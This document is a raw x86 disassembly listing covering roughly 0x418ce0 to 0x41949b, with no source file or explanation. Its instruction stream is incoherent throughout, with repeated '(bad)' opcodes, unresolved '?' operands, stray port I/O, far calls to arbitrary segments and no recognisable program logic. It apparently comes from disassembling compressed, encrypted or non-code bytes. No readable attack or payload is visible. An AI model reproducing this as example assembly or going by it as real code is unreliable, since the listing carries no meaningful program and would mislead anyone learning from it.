  418ce0:	repnz xor ah,BYTE PTR [edi-0x71723dc3]
  418ce7:	test   ebp,0x3311f4f3
  418ced:	sti    
  418cee:	daa    
  418cef:	fisttp QWORD PTR [eax-0x16]
  418cf2:	sti    
  418cf3:	add    BYTE PTR [ecx-0x60],dh
  418cf6:	dec    ebp
  418cf7:	jg     0x418d19
  418cf9:	lods   eax,DWORD PTR ds:[esi]
  418cfa:	imul   esp,DWORD PTR [ebx-0x30],0x25c1b22
  418d01:	(bad)  
  418d02:	int3   
  418d03:	rcl    BYTE PTR [edx],0x98
  418d06:	jo     0x418d2f
  418d08:	xchg   esp,eax
  418d09:	not    BYTE PTR [ecx]
  418d0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d0c:	popa   
  418d0d:	and    ah,bh
  418d0f:	cmp    bh,0x94
  418d12:	pop    ebx
  418d13:	ret    
  418d14:	cli    
  418d15:	int3   
  418d16:	mov    WORD PTR [esi-0xc],ss
  418d19:	push   ss
  418d1a:	mov    ecx,0xe5006709
  418d1f:	pushf  
  418d20:	or     DWORD PTR [eax],edi
  418d22:	cmp    al,BYTE PTR [esi-0x62]
  418d25:	enter  0x5deb,0xee
  418d29:	jae    0x418d51
  418d2b:	and    BYTE PTR [edx],ch
  418d2d:	pop    ecx
  418d2e:	shl    BYTE PTR [ecx-0x1c],1
  418d31:	cmc    
  418d32:	mov    al,ds:0x70ebf248
  418d37:	std    
  418d38:	sbb    cl,BYTE PTR [edi]
  418d3a:	outs   dx,BYTE PTR ds:[esi]
  418d3b:	stos   BYTE PTR es:[edi],al
  418d3c:	mov    BYTE PTR [esi-0xd7cd072],dh
  418d42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d43:	fstp   st(5)
  418d45:	adc    esi,DWORD PTR [edi-0x43f60c5b]
  418d4b:	shl    DWORD PTR [ebx-0x274aea21],1
  418d51:	xchg   ebp,eax
  418d52:	imul   esp,DWORD PTR [edx+edi*1+0x42ea88d3],0x6f
  418d5a:	dec    eax
  418d5b:	jno    0x418d19
  418d5d:	mov    ebp,DWORD PTR [ebp-0x1d75967a]
  418d63:	jne    0x418cf8
  418d65:	in     eax,dx
  418d66:	xor    cl,BYTE PTR [eax+eax*1+0x7c]
  418d6a:	inc    esp
  418d6b:	mov    eax,ds:0xb0a062f3
  418d70:	adc    ebx,edi
  418d72:	mov    al,ds:0xcb64e1a7
  418d77:	addr16 loop 0x418d3b
  418d7a:	xor    ebp,ebx
  418d7c:	mov    ebx,DWORD PTR [eax+0x54]
  418d7f:	(bad)  
  418d81:	sbb    al,0xb9
  418d83:	pushf  
  418d84:	cdq    
  418d85:	xchg   esi,eax
  418d86:	stc    
  418d87:	mov    DWORD PTR [edx],esi
  418d89:	inc    ecx
  418d8a:	pop    ebp
  418d8b:	outs   dx,BYTE PTR ds:[esi]
  418d8c:	pop    edi
  418d8d:	(bad)  
  418d8f:	add    ch,BYTE PTR [esi]
  418d91:	add    ah,BYTE PTR [esi+eax*2]
  418d94:	sbb    eax,DWORD PTR ds:0x36866988
  418d9a:	push   edx
  418d9b:	clc    
  418d9c:	lds    edi,FWORD PTR ds:0xa3446bb
  418da2:	pop    esi
  418da3:	inc    edi
  418da4:	addr16 and DWORD PTR [di-0x72],esp
  418da9:	adc    BYTE PTR [ebx-0x143aba48],al
  418daf:	out    0xdf,al
  418db1:	ds stos DWORD PTR es:[edi],eax
  418db3:	je     0x418d77
  418db5:	mov    esp,0xa5e9d543
  418dba:	rol    BYTE PTR [edx-0x5fc008f],cl
  418dc0:	sti    
  418dc1:	call   0xb1b9a380
  418dc6:	fisttp DWORD PTR [esi]
  418dc8:	mov    BYTE PTR [bx+si+0x4ad4],cl
  418dcd:	sar    ah,0x94
  418dd0:	xchg   edx,eax
  418dd1:	mov    ah,0xf6
  418dd3:	call   0xb19039f9
  418dd8:	adc    BYTE PTR [esi+ebx*1],0x56
  418ddc:	xchg   BYTE PTR [edx],bh
  418dde:	push   0xf6525176
  418de3:	xchg   ebp,eax
  418de4:	sar    DWORD PTR [edi],cl
  418de6:	leave  
  418de7:	call   0xf207adf8
  418dec:	cli    
  418ded:	push   ebx
  418dee:	les    esp,FWORD PTR [ebx-0x7b84330d]
  418df4:	adc    al,0x68
  418df6:	addr16 cli 
  418df8:	test   al,0x2e
  418dfa:	(bad)  
  418dfb:	or     BYTE PTR [edx-0x37],dh
  418dfe:	sahf   
  418dff:	add    al,0x8
  418e01:	sbb    ebx,edi
  418e03:	mov    ecx,0xdaed8f66
  418e08:	leave  
  418e09:	sub    edx,DWORD PTR [eax]
  418e0b:	push   0xbf5b526e
  418e10:	fidiv  WORD PTR [ebp-0x2c]
  418e13:	sbb    ah,al
  418e15:	inc    eax
  418e16:	pushf  
  418e17:	fdivr  st,st(4)
  418e19:	xor    DWORD PTR [edi],edx
  418e1b:	sti    
  418e1c:	dec    esi
  418e1d:	int    0xec
  418e1f:	mov    bl,0x3a
  418e21:	jp     0x418db3
  418e23:	into   
  418e24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e25:	mov    esi,0xca01cf5b
  418e2a:	fild   DWORD PTR [ebx+0x8a4b17b]
  418e30:	out    0x3b,al
  418e32:	addr16 jne 0x418eb3
  418e35:	and    eax,0xada960d0
  418e3a:	retf   0xbe87
  418e3d:	mov    BYTE PTR [ebp-0x72a47542],cl
  418e43:	push   ecx
  418e44:	xchg   esp,eax
  418e45:	sbb    eax,0x13fda660
  418e4a:	ret    
  418e4b:	fwait
  418e4c:	pop    ds
  418e4d:	or     ah,BYTE PTR [ecx-0x717e08a2]
  418e53:	lods   al,BYTE PTR ds:[esi]
  418e54:	stos   DWORD PTR es:[edi],eax
  418e55:	in     eax,dx
  418e56:	ja     0x418def
  418e58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e59:	outs   dx,DWORD PTR ds:[esi]
  418e5a:	lahf   
  418e5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e5c:	jae    0x418dfb
  418e5e:	call   0x4d75:0x33d8f755
  418e65:	mov    ds:0xb117b5dc,al
  418e6a:	push   ds
  418e6b:	popa   
  418e6c:	popa   
  418e6d:	push   es
  418e6e:	adc    BYTE PTR [edi+0x561d01b0],dl
  418e74:	adc    cl,dl
  418e76:	call   0x60a361a4
  418e7b:	repz ficomp DWORD PTR [edi]
  418e7e:	(bad)  
  418e7f:	rol    BYTE PTR gs:[edi+0x17],1
  418e83:	int3   
  418e84:	js     0x418e34
  418e86:	lds    esp,FWORD PTR [edx+0x1b]
  418e89:	mov    dh,BYTE PTR [edx]
  418e8b:	repnz shl DWORD PTR [ebp-0x20],1
  418e8f:	adc    al,0x7d
  418e91:	ret    
  418e92:	push   ebp
  418e93:	stos   BYTE PTR es:[edi],al
  418e94:	cmc    
  418e95:	push   ds
  418e96:	mov    al,0xe1
  418e98:	gs popf 
  418e9a:	xor    ebx,DWORD PTR [ebx]
  418e9c:	and    ebx,DWORD PTR cs:[ebx-0x1f5925ef]
  418ea3:	test   BYTE PTR [esi+eax*8],dh
  418ea6:	xchg   ecx,eax
  418ea7:	push   ecx
  418ea8:	mov    ebp,DWORD PTR [esi]
  418eaa:	xchg   edi,eax
  418eab:	lahf   
  418eac:	cmp    DWORD PTR [edi],ebx
  418eae:	push   0x52
  418eb0:	ja     0x418eea
  418eb2:	xor    ebx,edx
  418eb4:	arpl   WORD PTR [edx-0x4dc64be4],si
  418eba:	or     BYTE PTR [edx-0x5d36b035],bh
  418ec0:	ss cmc 
  418ec2:	scas   eax,DWORD PTR es:[edi]
  418ec3:	inc    ebx
  418ec4:	scas   al,BYTE PTR es:[edi]
  418ec5:	hlt    
  418ec6:	retf   
  418ec7:	pop    edx
  418ec8:	outs   dx,DWORD PTR ds:[esi]
  418ec9:	dec    esi
  418eca:	je     0x418ebb
  418ecc:	mov    esp,0x8c5b8cf9
  418ed1:	jle    0x418e81
  418ed3:	mov    ebp,0xb817842c
  418ed8:	pop    ecx
  418ed9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418eda:	jns    0x418ef1
  418edc:	aam    0x72
  418ede:	or     bh,bh
  418ee0:	mov    BYTE PTR [esi],dh
  418ee2:	xchg   ecx,eax
  418ee3:	mov    eax,0x2052d1f5
  418ee8:	aaa    
  418ee9:	mov    ah,0x3b
  418eeb:	out    dx,al
  418eec:	pop    esi
  418eed:	rol    ah,0x1
  418ef0:	sbb    dh,BYTE PTR [edx]
  418ef2:	test   BYTE PTR [esi],cl
  418ef4:	push   ds
  418ef5:	out    0x92,eax
  418ef7:	(bad)  
  418ef8:	jne    0x418ed2
  418efa:	and    al,0xdf
  418efc:	mov    bh,0xe5
  418efe:	mov    dh,0xdc
  418f00:	mov    edx,ebp
  418f02:	sbb    DWORD PTR [ebx],esp
  418f04:	push   ds
  418f05:	sub    bl,0x45
  418f08:	icebp  
  418f09:	mov    edx,DWORD PTR [eax-0x7dd2371a]
  418f0f:	xor    ecx,ebx
  418f11:	mov    esp,0x4e5b3822
  418f16:	inc    ebx
  418f17:	popf   
  418f18:	jo     0x418ea0
  418f1a:	enter  0x500d,0x9
  418f1e:	xchg   esp,eax
  418f1f:	xchg   ecx,eax
  418f20:	mov    edi,0x814d6bb8
  418f25:	cmp    eax,DWORD PTR [esi+edi*8]
  418f28:	ja     0x418f8e
  418f2a:	mov    cl,0x6f
  418f2c:	xchg   esi,eax
  418f2d:	enter  0x555e,0x80
  418f31:	jne    0x418f9c
  418f33:	sub    BYTE PTR [edi],cl
  418f35:	jb     0x418ef0
  418f37:	sub    eax,0x18fbc29a
  418f3c:	hlt    
  418f3d:	fcomp  DWORD PTR [ebx-0x2f]
  418f40:	add    cl,cl
  418f42:	dec    edx
  418f43:	add    al,0xe1
  418f45:	pop    edi
  418f46:	jge    0x418fb2
  418f48:	pop    ebx
  418f49:	xchg   ecx,eax
  418f4a:	and    ah,BYTE PTR [esp+edx*8-0x11]
  418f4e:	push   ss
  418f4f:	cmp    edx,ebx
  418f51:	sahf   
  418f52:	scas   al,BYTE PTR es:[edi]
  418f53:	sub    al,0x9c
  418f55:	sub    DWORD PTR ds:0x1d83827e,ebx
  418f5b:	inc    ebp
  418f5c:	(bad)  
  418f5d:	clc    
  418f5e:	outs   dx,BYTE PTR ds:[esi]
  418f5f:	mov    esp,0x1cedc0c0
  418f64:	fadd   DWORD PTR [edx]
  418f66:	fidiv  DWORD PTR [ecx-0x5]
  418f69:	add    eax,esi
  418f6b:	jbe    0x418fcf
  418f6d:	imul   edi,DWORD PTR [ebx],0xb5afcaa2
  418f73:	xor    edi,DWORD PTR [ecx+0x71d818ad]
  418f79:	sub    BYTE PTR [eax+0x1f],0x2c
  418f7d:	rcr    BYTE PTR [eax],0xa8
  418f80:	pop    ss
  418f81:	in     al,dx
  418f82:	sub    dh,BYTE PTR [esi]
  418f84:	xor    ebp,DWORD PTR [ecx+esi*2]
  418f87:	or     ecx,ebx
  418f89:	mov    ebx,edx
  418f8b:	mov    ecx,0xc3c2e741
  418f90:	dec    edi
  418f91:	adc    al,0xcd
  418f93:	jecxz  0x418f86
  418f95:	sub    al,BYTE PTR [edi-0x63]
  418f98:	ror    BYTE PTR [edx+0x38fe9113],1
  418f9e:	enter  0x2a95,0xa1
  418fa2:	in     al,0x5
  418fa4:	ja     0x418f88
  418fa6:	adc    bh,dl
  418fa8:	fcomip st,st(7)
  418faa:	or     DWORD PTR [edi],0x6b209a9e
  418fb0:	and    BYTE PTR [di],0x4d
  418fb4:	pop    esi
  418fb5:	pop    edx
  418fb6:	pop    eax
  418fb7:	pusha  
  418fb8:	imul   esi,DWORD PTR [esi-0x691c1042],0xffffffd0
  418fbf:	xchg   ebp,eax
  418fc0:	(bad)  
  418fc1:	fdivr  QWORD PTR [edx+0x69dc0b6]
  418fc7:	call   0x10b5ae34
  418fcc:	add    DWORD PTR [edx],0xffffff89
  418fcf:	pop    ebx
  418fd0:	jne    0x418fc4
  418fd2:	inc    edx
  418fd3:	ret    
  418fd4:	fisubr DWORD PTR [eax-0x4832fdfc]
  418fda:	xchg   ebp,eax
  418fdb:	inc    esp
  418fdc:	(bad)  
  418fde:	mov    ecx,0x845a37ef
  418fe3:	lea    ecx,[eax-0x1439214f]
  418fe9:	push   ecx
  418fea:	aas    
  418feb:	adc    dl,BYTE PTR [edi]
  418fed:	cmp    DWORD PTR [eax+ebx*1+0x46f1f129],esp
  418ff4:	jp     0x418fa7
  418ff6:	mov    edx,0x60aaf60e
  418ffb:	xchg   edx,eax
  418ffc:	fimul  WORD PTR [ecx+0x70]
  418fff:	push   0x2
  419001:	and    bl,BYTE PTR [ebp-0x42]
  419004:	xor    esp,ebx
  419006:	pop    esp
  419007:	mov    esi,0x18365ba5
  41900c:	cmp    al,0x56
  41900e:	rcl    edx,0xfe
  419011:	jp     0x41904b
  419013:	jno    0x418ff2
  419015:	shl    ah,cl
  419017:	aam    0x4b
  419019:	xchg   esi,eax
  41901a:	pop    ecx
  41901b:	bound  eax,QWORD PTR [ebx-0x6512734e]
  419021:	sub    al,0xd5
  419023:	pusha  
  419024:	push   edx
  419025:	mov    ebx,0x40659597
  41902a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41902b:	retf   
  41902c:	jmp    0x655c:0xa221feca
  419033:	ror    BYTE PTR [ebx-0x3a655ae1],cl
  419039:	and    eax,0xb5d26466
  41903e:	push   0x51e4382e
  419043:	retf   
  419044:	add    al,0xf6
  419046:	add    dh,bh
  419048:	or     DWORD PTR [ebx+0x5a],edx
  41904b:	imul   ebx,DWORD PTR [edx-0x7c],0xbe8c4a3a
  419052:	mov    eax,gs
  419054:	popa   
  419055:	pop    edx
  419056:	lock xchg esp,eax
  419058:	adc    edi,DWORD PTR [eax+0x18]
  41905b:	fs fsubrp st(7),st
  41905e:	lds    edi,FWORD PTR [eax-0x35e0871a]
  419064:	xchg   edx,eax
  419065:	adc    dh,BYTE PTR [ebp+0x65442a02]
  41906b:	loop   0x419076
  41906d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41906e:	jbe    0x419063
  419070:	dec    ebp
  419071:	fadd   st(0),st
  419073:	add    al,BYTE PTR [edx+0x57]
  419076:	cmc    
  419077:	lock mov cl,BYTE PTR ds:0x76713e5b
  41907e:	inc    edx
  41907f:	inc    ecx
  419080:	jo     0x41909e
  419082:	(bad)  
  419083:	mov    ds:0x2a8bcb2f,al
  419088:	daa    
  419089:	jge    0x4190be
  41908b:	scas   al,BYTE PTR es:[edi]
  41908c:	loop   0x41910a
  41908e:	mov    ch,0x9
  419090:	test   al,0x58
  419092:	das    
  419093:	mov    BYTE PTR [ebx+0x3667afb2],bh
  419099:	mov    ebp,0x530eb345
  41909e:	test   dl,al
  4190a0:	dec    edx
  4190a1:	out    dx,al
  4190a2:	push   eax
  4190a3:	data16 jne 0x41905b
  4190a6:	push   ebx
  4190a7:	gs sbb edi,edx
  4190aa:	popf   
  4190ab:	mov    ebp,0xe0f1c54c
  4190b0:	and    DWORD PTR [edx],ebx
  4190b2:	aad    0x5b
  4190b4:	(bad)  
  4190b5:	push   ebp
  4190b6:	in     eax,dx
  4190b7:	jp     0x419134
  4190b9:	pop    ds
  4190ba:	int3   
  4190bb:	ins    BYTE PTR es:[edi],dx
  4190bc:	pop    ebx
  4190bd:	std    
  4190be:	jb     0x4190a6
  4190c0:	push   ds
  4190c1:	and    dl,cl
  4190c3:	xchg   ecx,eax
  4190c4:	adc    BYTE PTR [ebx],bl
  4190c6:	inc    ecx
  4190c7:	dec    esp
  4190c8:	shl    BYTE PTR [edx],0x97
  4190cb:	shl    DWORD PTR [edx+eiz*2-0x44],0x63
  4190d0:	and    ch,cl
  4190d2:	imul   esp,ebp,0xffffffc2
  4190d5:	mov    ?,WORD PTR ds:0xb28a51a9
  4190db:	mov    ds:0xd7b85c3a,al
  4190e0:	mov    dh,0x8a
  4190e2:	daa    
  4190e3:	neg    BYTE PTR [edi]
  4190e5:	enter  0xc721,0x7a
  4190e9:	sbb    al,0x35
  4190eb:	cmp    esp,DWORD PTR [ebp-0x1a]
  4190ee:	adc    BYTE PTR [edx],bl
  4190f0:	sbb    DWORD PTR [esi-0x3c],0x499d7fb2
  4190f7:	mov    ds,WORD PTR [edi]
  4190f9:	inc    esi
  4190fa:	jg     0x419113
  4190fc:	mov    ds:0xeee2ed92,al
  419101:	add    DWORD PTR [ebx],0xffffffb2
  419104:	inc    ebx
  419105:	push   es
  419106:	cli    
  419107:	mov    ebp,0xa7070177
  41910c:	adc    al,0x96
  41910e:	mov    bh,0x54
  419110:	inc    esp
  419111:	mov    es,WORD PTR [ebp-0x23ff18bf]
  419117:	psllw  mm6,QWORD PTR fs:[ebx+ebx*8-0x529c6ac2]
  419120:	imul   ebx,DWORD PTR [esp+edi*4-0x39c4dad8],0xa7b05a46
  41912b:	inc    eax
  41912c:	mov    al,ds:0x1974c34
  419132:	push   es
  419133:	in     al,0xd6
  419135:	leave  
  419136:	jnp    0x419159
  419138:	sub    al,0x2f
  41913a:	and    BYTE PTR [edx-0x4767329e],dh
  419140:	cmp    eax,0x7b6ed9ef
  419145:	sahf   
  419146:	test   eax,0xed41f13f
  41914b:	daa    
  41914c:	push   ds
  41914d:	mov    dl,0xc9
  41914f:	xor    ah,dl
  419151:	gs inc ebp
  419153:	mov    bl,0x10
  419155:	xchg   edx,eax
  419156:	mov    dl,0xef
  419158:	int    0x91
  41915a:	jnp    0x41918f
  41915c:	mov    edx,0x7705b87b
  419161:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419162:	add    DWORD PTR gs:[eax],edx
  419165:	cld    
  419166:	adc    dh,BYTE PTR [esp+eax*2]
  419169:	mov    cl,0x3e
  41916b:	or     al,0x1d
  41916d:	in     al,dx
  41916e:	mov    esp,0x67d79657
  419173:	sbb    esi,DWORD PTR [ebx+eax*8]
  419176:	jns    0x41919e
  419178:	bnd jns 0x4191c7
  41917b:	jg     0x41911d
  41917d:	js     0x419175
  41917f:	aam    0x16
  419181:	sub    eax,0xb7928c55
  419186:	call   0x78b4:0x74765c2d
  41918d:	adc    eax,0x283bf468
  419192:	adc    DWORD PTR [ebp-0x263a217d],edx
  419198:	or     edi,eax
  41919a:	dec    ebp
  41919b:	scas   al,BYTE PTR es:[edi]
  41919c:	add    BYTE PTR [ecx+0x6c],ah
  41919f:	(bad)  
  4191a0:	mov    ebx,0xe1735cd2
  4191a5:	or     al,0x69
  4191a7:	inc    ecx
  4191a8:	add    DWORD PTR [edi],esi
  4191aa:	mov    ebp,0x2770ee69
  4191af:	out    0x8c,eax
  4191b1:	retf   0xb6f2
  4191b4:	mov    ecx,0x4941bfe4
  4191b9:	pop    ds
  4191ba:	std    
  4191bb:	leave  
  4191bc:	jl     0x4191a7
  4191be:	mov    ecx,0x4e37b734
  4191c3:	pop    ebx
  4191c4:	mov    dl,0x74
  4191c6:	push   esi
  4191c7:	das    
  4191c8:	retf   0xaaf9
  4191cb:	aad    0x26
  4191cd:	push   esp
  4191ce:	rol    eax,cl
  4191d0:	xor    BYTE PTR [edi],dh
  4191d2:	fiadd  WORD PTR [edi-0x5d]
  4191d5:	xchg   esi,eax
  4191d6:	sti    
  4191d7:	rol    DWORD PTR [ebp-0x4007ca11],1
  4191dd:	mov    ecx,0xca1ec7b1
  4191e2:	pop    edi
  4191e3:	sub    al,BYTE PTR [edi]
  4191e5:	mov    ebp,0x648327fa
  4191ea:	outs   dx,BYTE PTR ds:[esi]
  4191eb:	sub    bl,BYTE PTR [ebp+ebx*8-0x40]
  4191ef:	cmp    al,dh
  4191f1:	sbb    BYTE PTR [ecx+0xf],0x6d
  4191f5:	mov    dl,0x3a
  4191f7:	cmc    
  4191f8:	stos   DWORD PTR es:[edi],eax
  4191f9:	mov    DWORD PTR [edx+0x3b],edx
  4191fc:	push   esi
  4191fd:	call   0xce53:0x1796e588
  419204:	or     ch,dh
  419206:	popf   
  419207:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419208:	into   
  419209:	outs   dx,BYTE PTR ds:[esi]
  41920a:	push   ebx
  41920b:	(bad)  [edx+ebp*8+0x2f1e831d]
  419212:	ins    DWORD PTR es:[edi],dx
  419213:	or     BYTE PTR [ebp+0x18],bh
  419216:	arpl   WORD PTR [esi+0xb],bp
  419219:	xor    eax,0x3a09520e
  41921e:	popa   
  41921f:	push   eax
  419220:	add    ebp,0xddaf8e9e
  419226:	mov    ds:0xac771955,eax
  41922b:	jnp    0x41922d
  41922d:	scas   al,BYTE PTR es:[edi]
  41922e:	push   es
  41922f:	mov    bl,0x38
  419231:	mov    esi,0x1d7e8ec
  419236:	sub    BYTE PTR [eax+0x67d43667],cl
  41923c:	push   ebp
  41923d:	cmc    
  41923e:	int    0xda
  419240:	fimul  DWORD PTR [edx]
  419242:	lahf   
  419243:	ret    0x2188
  419246:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419247:	cwde   
  419248:	push   0x29
  41924a:	repnz daa 
  41924c:	dec    ecx
  41924d:	inc    ebx
  41924e:	xchg   BYTE PTR ds:0xb30f0f7d,dl
  419254:	xchg   esp,eax
  419255:	in     al,0xf
  419257:	adc    DWORD PTR [bp+di],ebx
  41925a:	arpl   WORD PTR [eax],ax
  41925c:	shr    BYTE PTR [ebx+0x312d0361],cl
  419262:	into   
  419263:	dec    ebp
  419264:	sub    ch,BYTE PTR [ecx+0x6a]
  419267:	jb     0x419284
  419269:	xor    ch,ch
  41926b:	push   ebx
  41926c:	fild   DWORD PTR [ebp+0x17]
  41926f:	and    edx,esp
  419271:	push   0xffffff86
  419273:	jno    0x4192f1
  419275:	xchg   al,cl
  419277:	mov    BYTE PTR [ebx-0x10],bh
  41927a:	ins    DWORD PTR es:[edi],dx
  41927b:	daa    
  41927c:	cmp    al,0xd6
  41927e:	adc    DWORD PTR [edi+0x5017eed5],ebp
  419284:	mov    dl,0x6b
  419286:	mov    esi,0x98e2a9
  41928b:	sub    esi,eax
  41928d:	cmp    al,0x71
  41928f:	or     eax,0x3b4eb67c
  419294:	das    
  419295:	push   ecx
  419296:	shr    DWORD PTR [eax-0x32cc1d91],1
  41929c:	xchg   ebx,eax
  41929d:	imul   ecx,esi,0x332ccdfe
  4192a3:	popa   
  4192a4:	jmp    0x9400cf07
  4192a9:	cwde   
  4192aa:	inc    esi
  4192ab:	loope  0x4192ed
  4192ad:	mov    al,ah
  4192af:	cwde   
  4192b0:	out    dx,eax
  4192b1:	popf   
  4192b2:	mov    edx,0x80cb6673
  4192b7:	add    eax,0x9f8a40a3
  4192bc:	jbe    0x4192e5
  4192be:	dec    ebx
  4192bf:	adc    BYTE PTR [ecx+esi*4],bl
  4192c2:	fwait
  4192c3:	push   0x258f9269
  4192c8:	cmp    edx,edx
  4192ca:	push   edx
  4192cb:	cmp    al,0xcf
  4192cd:	loopne 0x419319
  4192cf:	fild   QWORD PTR [edx-0x4a]
  4192d2:	dec    ebx
  4192d3:	pusha  
  4192d4:	adc    DWORD PTR [ecx-0x419ce2b0],0xffffffc5
  4192db:	jg     0x419337
  4192dd:	std    
  4192de:	cwde   
  4192df:	mov    ah,al
  4192e1:	sbb    ch,ah
  4192e3:	ins    BYTE PTR es:[edi],dx
  4192e4:	ficomp DWORD PTR [ebp+0x6e]
  4192e7:	mov    eax,0x4e1cb934
  4192ec:	mov    WORD PTR [edi+0x6b56f905],?
  4192f2:	retf   0x6e23
  4192f5:	cmp    al,0x5a
  4192f7:	xor    ah,BYTE PTR [ebx]
  4192f9:	outs   dx,DWORD PTR ds:[esi]
  4192fa:	repz xor al,0x80
  4192fd:	inc    ecx
  4192fe:	cdq    
  4192ff:	and    bh,al
  419301:	jno    0x41934a
  419303:	lock test DWORD PTR [edi-0x15],edi
  419307:	(bad)  
  419308:	call   0x3b8c:0x2e7b22a7
  41930f:	jnp    0x419304
  419311:	ret    
  419312:	sub    DWORD PTR [ecx-0x68],esi
  419315:	inc    esp
  419316:	inc    esp
  419317:	mov    ecx,0x17d2206d
  41931c:	clc    
  41931d:	jmp    0x8ec632eb
  419322:	xor    DWORD PTR [edi],ecx
  419324:	outs   dx,DWORD PTR ds:[esi]
  419325:	ror    DWORD PTR [eax-0x44],cl
  419328:	cs xchg esp,eax
  41932a:	lea    ecx,[edi-0x25]
  41932d:	fld    QWORD PTR ds:0xae97d8ac
  419333:	fs jecxz 0x419344
  419336:	shr    BYTE PTR [eax+0x237f0060],1
  41933c:	aas    
  41933d:	pop    esi
  41933e:	jae    0x4192f6
  419340:	jb     0x4193ba
  419342:	inc    esp
  419343:	push   cs
  419344:	leave  
  419345:	xchg   esi,eax
  419346:	lahf   
  419347:	test   ch,bh
  419349:	iret   
  41934a:	push   edx
  41934b:	mov    bh,BYTE PTR [eax]
  41934d:	adc    BYTE PTR [eax],0x9e
  419350:	xchg   ebp,eax
  419351:	and    DWORD PTR [bp+di-0x1e],edx
  419355:	fimul  DWORD PTR [eax+0x74a8a8f9]
  41935b:	push   es
  41935c:	ror    BYTE PTR [ebx],1
  41935e:	jg     0x4192e0
  419360:	mov    BYTE PTR [edx],0x14
  419363:	push   0xb6ae1855
  419368:	push   ebp
  419369:	call   edx
  41936b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41936c:	shl    DWORD PTR [edx-0x7f],cl
  41936f:	aaa    
  419370:	jl     0x419395
  419372:	xor    DWORD PTR [ecx+0x45909db],0x61367b73
  41937c:	retf   0xaf80
  41937f:	pop    ecx
  419380:	or     eax,0x827cd2ac
  419385:	jne    0x419308
  419387:	in     eax,dx
  419388:	pusha  
  419389:	jo     0x4193b9
  41938b:	les    ebp,FWORD PTR [edx+0x1b31a018]
  419391:	and    al,0x56
  419393:	or     ecx,DWORD PTR [edx+0x472e7a76]
  419399:	out    0x62,eax
  41939b:	mov    esi,0x2280ef63
  4193a0:	push   esp
  4193a1:	stos   BYTE PTR es:[edi],al
  4193a2:	sbb    bh,ch
  4193a4:	mov    eax,0xf7039fe4
  4193a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4193aa:	(bad)  
  4193ab:	push   edx
  4193ac:	inc    esi
  4193ad:	push   esi
  4193ae:	cmp    al,0xb3
  4193b0:	mov    ebp,0x965f6f8f
  4193b5:	xor    esi,DWORD PTR [ecx-0x44]
  4193b8:	and    bh,BYTE PTR [eax+0x30]
  4193bb:	dec    ebp
  4193bc:	pushf  
  4193bd:	(bad)  
  4193bf:	push   es
  4193c0:	sbb    al,0x2b
  4193c2:	sbb    al,0x13
  4193c4:	dec    ebp
  4193c5:	fidiv  DWORD PTR [ebx-0x4d]
  4193c8:	loope  0x41941f
  4193ca:	xor    esp,DWORD PTR [esi]
  4193cc:	shr    BYTE PTR [ebx-0x7f],1
  4193cf:	fisttp QWORD PTR [edi+esi*2]
  4193d2:	psrad  mm3,QWORD PTR [eax-0x15]
  4193d6:	sub    eax,0xa67778c9
  4193db:	add    al,0x78
  4193dd:	lock neg DWORD PTR gs:[edx]
  4193e1:	pop    ebp
  4193e2:	push   ebp
  4193e3:	pop    edx
  4193e4:	(bad)  
  4193e5:	xchg   edi,eax
  4193e6:	adc    al,0x2
  4193e8:	cs pop ebp
  4193ea:	ins    BYTE PTR es:[edi],dx
  4193eb:	sbb    edi,DWORD PTR [esi-0x69760629]
  4193f1:	fwait
  4193f2:	jb     0x41937c
  4193f4:	push   ss
  4193f5:	pop    DWORD PTR [esi-0x7]
  4193f8:	cdq    
  4193f9:	std    
  4193fa:	stos   DWORD PTR es:[edi],eax
  4193fb:	repnz retf 
  4193fd:	sub    al,BYTE PTR [esi+edx*1-0x2ff704d6]
  419404:	mov    ch,0x5a
  419406:	ja     0x419441
  419408:	daa    
  419409:	pop    esi
  41940a:	pusha  
  41940b:	push   0xffffffb4
  41940d:	and    DWORD PTR [edx-0x56b6d326],ecx
  419413:	int3   
  419414:	push   edi
  419415:	xchg   ecx,edx
  419417:	cld    
  419418:	pushf  
  419419:	mov    WORD PTR [eax+0x6edaec6c],fs
  41941f:	jb     0x419484
  419421:	jecxz  0x4193c9
  419423:	outs   dx,BYTE PTR ds:[esi]
  419424:	(bad)  
  419425:	push   ebp
  419426:	inc    ecx
  419427:	inc    edx
  419428:	int3   
  419429:	arpl   WORD PTR [edi+0x272f354a],dx
  41942f:	imul   ebx,DWORD PTR [ebx-0x88e12fe],0xd74c6de4
  419439:	mov    DWORD PTR [ebp-0x6f],esp
  41943c:	arpl   WORD PTR [edx+0x40bb5aaf],dx
  419442:	mov    al,0xf8
  419444:	cmp    BYTE PTR [edx],al
  419446:	xchg   esi,eax
  419447:	xor    bh,BYTE PTR [edx]
  419449:	mov    DWORD PTR [ebx+eiz*1+0x3c381edd],ecx
  419450:	add    al,0xd1
  419452:	or     al,0x2
  419454:	jge    0x419428
  419456:	idiv   esp
  419458:	bound  eax,QWORD PTR [edx-0xd]
  41945b:	pop    esp
  41945c:	test   DWORD PTR [edx+ebp*4+0x21],0xa2f6c116
  419464:	dec    edi
  419465:	enter  0xf9ef,0x6a
  419469:	fucom  st(0)
  41946b:	test   al,0x9a
  41946d:	sar    BYTE PTR [ebp+0x66],1
  419470:	mov    eax,0x472e7af6
  419475:	aaa    
  419476:	das    
  419477:	enter  0xdd9d,0x13
  41947b:	in     eax,dx
  41947c:	stos   DWORD PTR es:[edi],eax
  41947d:	and    bl,BYTE PTR [eax+0x1d]
  419480:	cmp    DWORD PTR cs:0x6a356aea,esi
  419487:	xchg   DWORD PTR [ebx+0x1628374f],ebp
  41948d:	pop    ebp
  41948e:	pop    ebp
  41948f:	aad    0xb8
  419491:	push   ds
  419492:	test   eax,0xcece336d
  419497:	shl    bh,cl
  419499:	sbb    cl,dh
